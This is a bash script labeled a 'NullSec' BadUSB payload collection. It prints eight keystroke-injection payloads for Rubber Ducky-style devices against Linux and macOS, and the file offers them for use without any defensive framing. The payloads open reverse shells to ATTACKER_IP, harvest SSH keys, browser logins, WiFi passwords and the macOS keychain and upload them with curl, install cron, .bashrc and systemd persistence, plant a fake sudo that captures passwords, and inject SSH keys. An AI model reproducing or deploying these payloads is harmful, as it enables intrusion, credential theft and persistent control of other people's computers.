#!/bin/bash
#===============================================================================
#  NULLSEC BADUSB - Linux/macOS Payload Collection
#  For Hak5 Rubber Ducky / Bash Bunny / BadUSB devices
#===============================================================================

# ====== PAYLOAD 1: QUICK REVERSE SHELL ======
# Gnome Terminal reverse shell
cat << 'PAYLOAD1'
DELAY 500
ALT F2
DELAY 300
STRING gnome-terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
PAYLOAD1

# ====== PAYLOAD 2: CREDENTIAL HARVESTER ======
cat << 'PAYLOAD2'
DELAY 500
ALT F2
DELAY 300
STRING gnome-terminal
ENTER
DELAY 1000
STRING mkdir -p /tmp/.loot && cd /tmp/.loot
ENTER
STRING # SSH keys
ENTER
STRING cp -r ~/.ssh . 2>/dev/null
ENTER
STRING # Browser data
ENTER
STRING cp ~/.mozilla/firefox/*.default*/logins.json . 2>/dev/null
ENTER
STRING cp -r ~/.config/google-chrome/Default/Login* . 2>/dev/null
ENTER
STRING # History
ENTER
STRING cat ~/.bash_history > bash_history.txt 2>/dev/null
ENTER
STRING # WiFi passwords
ENTER
STRING sudo grep -r "psk=" /etc/NetworkManager/system-connections/ > wifi.txt 2>/dev/null
ENTER
STRING # Exfil
ENTER
STRING tar czf loot.tar.gz * && curl -F "file=@loot.tar.gz" http://ATTACKER_IP:8080/upload
ENTER
STRING rm -rf /tmp/.loot
ENTER
PAYLOAD2

# ====== PAYLOAD 3: PERSISTENCE INSTALLER ======
cat << 'PAYLOAD3'
DELAY 500
ALT F2
DELAY 300
STRING gnome-terminal
ENTER
DELAY 1000
STRING # Cron persistence
ENTER
STRING (crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -
ENTER
STRING # Bashrc persistence
ENTER
STRING echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc
ENTER
STRING # Systemd user service
ENTER
STRING mkdir -p ~/.config/systemd/user
ENTER
STRING echo -e "[Unit]\nDescription=User Service\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\nRestart=always\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/user-service.service
ENTER
STRING systemctl --user daemon-reload && systemctl --user enable user-service
ENTER
STRING clear && exit
ENTER
PAYLOAD3

# ====== PAYLOAD 4: SUDO CREDENTIAL CAPTURE ======
cat << 'PAYLOAD4'
DELAY 500
ALT F2
DELAY 300
STRING gnome-terminal
ENTER
DELAY 1000
STRING # Create fake sudo
ENTER
STRING mkdir -p ~/.local/bin
ENTER
STRING cat > ~/.local/bin/sudo << 'EOF'
#!/bin/bash
read -sp "[sudo] password for $USER: " pass
echo "$USER:$pass" | curl -X POST -d @- http://ATTACKER_IP:8080/creds
echo ""
/usr/bin/sudo -S $@ <<< "$pass"
EOF
ENTER
STRING chmod +x ~/.local/bin/sudo
ENTER
STRING echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
ENTER
STRING clear && exit
ENTER
PAYLOAD4

# ====== PAYLOAD 5: macOS REVERSE SHELL ======
cat << 'PAYLOAD5_MAC'
DELAY 500
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
PAYLOAD5_MAC

# ====== PAYLOAD 6: macOS KEYCHAIN DUMP ======
cat << 'PAYLOAD6_MAC'
DELAY 500
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING security dump-keychain -d login.keychain 2>/dev/null | curl -X POST -d @- http://ATTACKER_IP:8080/keychain
ENTER
STRING exit
ENTER
PAYLOAD6_MAC

# ====== PAYLOAD 7: SSH KEY INJECTION ======
cat << 'PAYLOAD7'
DELAY 500
ALT F2
DELAY 300
STRING gnome-terminal
ENTER
DELAY 1000
STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh
ENTER
STRING echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY...nullsec" >> ~/.ssh/authorized_keys
ENTER
STRING chmod 600 ~/.ssh/authorized_keys
ENTER
STRING clear && exit
ENTER
PAYLOAD7

# ====== PAYLOAD 8: FULL SYSTEM DUMP ======
cat << 'PAYLOAD8'
DELAY 500
ALT F2
DELAY 300
STRING gnome-terminal
ENTER
DELAY 1000
STRING cd /tmp && mkdir .recon && cd .recon
ENTER
STRING echo "=== SYSTEM INFO ===" > recon.txt
ENTER
STRING uname -a >> recon.txt
ENTER
STRING cat /etc/*release >> recon.txt 2>/dev/null
ENTER
STRING echo -e "\n=== NETWORK ===" >> recon.txt
ENTER
STRING ip a >> recon.txt
ENTER
STRING netstat -tulpn >> recon.txt 2>/dev/null
ENTER
STRING echo -e "\n=== USERS ===" >> recon.txt
ENTER
STRING cat /etc/passwd >> recon.txt
ENTER
STRING echo -e "\n=== SUDO ===" >> recon.txt
ENTER
STRING sudo -l >> recon.txt 2>/dev/null
ENTER
STRING echo -e "\n=== SUID FILES ===" >> recon.txt
ENTER
STRING find / -perm -4000 2>/dev/null | head -50 >> recon.txt
ENTER
STRING curl -F "file=@recon.txt" http://ATTACKER_IP:8080/upload
ENTER
STRING cd / && rm -rf /tmp/.recon
ENTER
STRING clear && exit
ENTER
PAYLOAD8

echo "NullSec Linux/macOS BadUSB Payloads"
echo "Replace ATTACKER_IP with your IP"
echo ""
echo "Payloads available:"
echo "  1. Quick Reverse Shell (Linux)"
echo "  2. Credential Harvester (Linux)"  
echo "  3. Persistence Installer (Linux)"
echo "  4. Sudo Credential Capture (Linux)"
echo "  5. Reverse Shell (macOS)"
echo "  6. Keychain Dump (macOS)"
echo "  7. SSH Key Injection"
echo "  8. Full System Dump"
